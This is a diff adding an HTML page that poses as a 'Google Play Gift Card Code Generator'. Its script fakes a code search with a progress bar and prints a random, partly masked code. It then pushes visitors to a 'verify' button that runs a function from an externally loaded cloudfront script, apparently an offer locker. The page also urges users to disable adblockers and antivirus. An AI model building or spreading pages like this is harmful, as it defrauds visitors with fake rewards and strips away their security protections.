@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Play Gift Card Code Generator Pro</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: url('https://i.imgur.com/vnHAcHi.png') no-repeat center center fixed;
+    background-size: cover;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px 12px 40px;
+    color: #fff;
+  }
+
+  .container {
+    width: 100%;
+    max-width: 720px;
+    text-align: center;
+  }
+
+  h1 {
+    font-weight: bold;
+    color: #000;
+    text-shadow: 2px 2px 4px rgba(255,255,255,0.6);
+    font-size: clamp(1.4rem, 5vw, 2.4rem);
+    margin-bottom: 16px;
+    padding: 10px;
+    background: rgba(255,255,255,0.85);
+    border-radius: 12px;
+  }
+
+  .intro {
+    background: rgba(0,0,0,0.7);
+    border-radius: 12px;
+    padding: 14px;
+    margin-bottom: 24px;
+    font-size: clamp(0.9rem, 3vw, 1.05rem);
+    line-height: 1.5;
+  }
+
+  .cards {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 14px;
+    margin-bottom: 10px;
+  }
+
+  @media (min-width: 600px) {
+    .cards { grid-template-columns: repeat(4, 1fr); }
+  }
+
+  .card {
+    background: #fff;
+    border-radius: 16px;
+    padding: 10px;
+    cursor: pointer;
+    transition: transform 0.25s ease, box-shadow 0.25s ease, border 0.2s ease;
+    border: 3px solid transparent;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+  }
+
+  .card img {
+    width: 100%;
+    height: auto;
+    border-radius: 12px;
+    display: block;
+  }
+
+  .card.selected {
+    transform: scale(1.08) translateY(-6px);
+    border-color: #00c853;
+    box-shadow: 0 8px 24px rgba(0,200,83,0.6);
+    z-index: 5;
+    position: relative;
+  }
+
+  .generate-btn, .verify-btn {
+    display: none;
+    margin: 18px auto 6px;
+    padding: 14px 34px;
+    font-size: 1.05rem;
+    font-weight: bold;
+    color: #fff;
+    background: linear-gradient(135deg, #00c853, #009624);
+    border: none;
+    border-radius: 30px;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    width: auto;
+    max-width: 90%;
+  }
+
+  .verify-btn { background: linear-gradient(135deg, #ff9800, #f57c00); }
+
+  .status-box {
+    display: none;
+    background: rgba(0,0,0,0.85);
+    border-radius: 12px;
+    padding: 16px;
+    margin-top: 18px;
+    text-align: left;
+  }
+
+  .status-bar {
+    width: 100%;
+    height: 14px;
+    background: #333;
+    border-radius: 7px;
+    overflow: hidden;
+    margin-bottom: 12px;
+  }
+
+  .status-bar-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #00c853, #64dd17);
+    border-radius: 7px;
+    transition: width 0.4s ease;
+  }
+
+  .status-text {
+    font-size: 0.95rem;
+    min-height: 44px;
+    word-break: break-all;
+  }
+
+  .code-display {
+    display: none;
+    background: rgba(255,255,255,0.95);
+    color: #000;
+    font-family: 'Courier New', monospace;
+    font-weight: bold;
+    font-size: clamp(1.1rem, 4.5vw, 1.6rem);
+    letter-spacing: 3px;
+    border-radius: 10px;
+    padding: 14px;
+    margin-top: 16px;
+    word-break: break-all;
+  }
+
+  .verify-msg {
+    display: none;
+    color: #ff1744;
+    font-weight: bold;
+    font-size: clamp(1rem, 4vw, 1.3rem);
+    margin-top: 18px;
+  }
+
+  .adblock-note {
+    display: none;
+    font-size: 0.85rem;
+    font-weight: bold;
+    font-style: italic;
+    margin-top: 12px;
+    background: rgba(0,0,0,0.7);
+    border-radius: 8px;
+    padding: 8px;
+  }
+</style>
+
+<script type="text/javascript">
+    var eLTFF_LDb_dxiFyc={"it":4639165,"key":"a2e78"};
+</script>
+<script src="https://d1chbu4sfo2xhu.cloudfront.net/d553273.js"></script>
+</head>
+<body>
+  <div class="container">
+    <h1>Google Play Gift Card Code Generator Pro</h1>
+
+    <div class="intro">
+      Generate Google Play gift cards that are 100% functional and tested. Select the gift card amount you want to generate, then click the “Generate Now” button. (PLEASE DO NOT ABUSE THIS TOOL.)
+    </div>
+
+    <div class="cards">
+      <div class="card" data-amount="$20"><img src="https://i.imgur.com/q1o1oHQ.png" alt="$20 Google Play Gift Card"></div>
+      <div class="card" data-amount="$25"><img src="https://i.imgur.com/wQdvh6H.png" alt="$25 Google Play Gift Card"></div>
+      <div class="card" data-amount="$50"><img src="https://i.imgur.com/y56vatQ.png" alt="$50 Google Play Gift Card"></div>
+      <div class="card" data-amount="$100"><img src="https://i.imgur.com/6whDEbo.png" alt="$100 Google Play Gift Card"></div>
+    </div>
+
+    <button class="generate-btn" id="generateBtn">GENERATE NOW</button>
+
+    <div class="status-box" id="statusBox">
+      <div class="status-bar"><div class="status-bar-fill" id="barFill"></div></div>
+      <div class="status-text" id="statusText"></div>
+    </div>
+
+    <div class="code-display" id="codeDisplay"></div>
+
+    <div class="verify-msg" id="verifyMsg"><span style="background-color: black; color: red; padding: 5px 10px;">Verify You're Not A Bot To Get Your Full Gift Card Codes</span></div>
+    <button class="verify-btn" id="verifyBtn">CLICK HERE TO VERIFY</button>
+    <div class="adblock-note" id="adblockNote">You may need to briefly disable any adblocker or anti virus in your device, as it may disrupt the verification page from displaying!</div>
+  </div>
+
+<script>
+  const cards = document.querySelectorAll('.card');
+  const generateBtn = document.getElementById('generateBtn');
+  const statusBox = document.getElementById('statusBox');
+  const barFill = document.getElementById('barFill');
+  const statusText = document.getElementById('statusText');
+  const codeDisplay = document.getElementById('codeDisplay');
+  const verifyMsg = document.getElementById('verifyMsg');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const adblockNote = document.getElementById('adblockNote');
+
+  let selected = null;
+  let running = false;
+
+  cards.forEach(c => c.addEventListener('click', () => {
+    if (running) return; // lock selection while simulation runs
+    cards.forEach(x => x.classList.remove('selected'));
+    c.classList.add('selected');
+    selected = c.dataset.amount;
+    generateBtn.style.display = 'block';
+    resetDownstream();
+  }));
+
+  function resetDownstream() {
+    statusBox.style.display = 'none';
+    codeDisplay.style.display = 'none';
+    verifyMsg.style.display = 'none';
+    verifyBtn.style.display = 'none';
+    adblockNote.style.display = 'none';
+    barFill.style.width = '0%';
+    statusText.innerHTML = '';
+  }
+
+  const randChar = () => {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    return chars[Math.floor(Math.random() * chars.length)];
+  };
+
+  const randString = n => Array.from({length: n}, randChar).join('');
+
+  generateBtn.addEventListener('click', () => {
+    if (!selected || running) return;
+    running = true;
+    generateBtn.style.display = 'none';
+    resetDownstream();
+    statusBox.style.display = 'block';
+
+    const steps = [
+      'Searching Google database for unused codes',
+      'Found gift codes for ' + selected + ' — verifying',
+      'Verifying codes',
+      'Deleting traces'
+    ];
+
+    let pct = 0;
+    const DURATION = 10000;      // total run: 10 seconds
+    const TICK = 100;            // update every 100ms
+    const increment = (TICK / DURATION) * 100; // +1% per tick
+
+    const progress = setInterval(() => {
+      pct = Math.min(100, pct + increment);
+      barFill.style.width = pct + '%';
+
+      // pick status step by progress
+      const stepIndex = Math.min(steps.length - 1, Math.floor((pct / 100) * steps.length));
+      statusText.innerHTML = steps[stepIndex] + '<br><b>' + randString(12) + '</b>';
+
+      if (pct >= 100) {
+        clearInterval(progress);
+        finish();
+      }
+    }, TICK);
+
+    function finish() {
+      running = false;
+      // 16-character claim reference with 4 masked positions
+      let code = '';
+      for (let i = 0; i < 16; i++) {
+        if (i >= 4 && i <= 7) code += '*';
+        else code += randChar();
+      }
+      codeDisplay.textContent = code;
+      codeDisplay.style.display = 'block';
+      verifyMsg.style.display = 'block';
+      verifyBtn.style.display = 'block';
+      adblockNote.style.display = 'block';
+      statusBox.style.display = 'none';
+    }
+  });
+
+  verifyBtn.addEventListener('click', () => {
+    if (typeof _TR === 'function') {
+      try { _TR(); } catch (e) { console.error(e); }
+    } else {
+      alert('Verification is unavailable. Please disable your adblocker and reload.');
+    }
+  });
+</script>
+</body>
+</html>
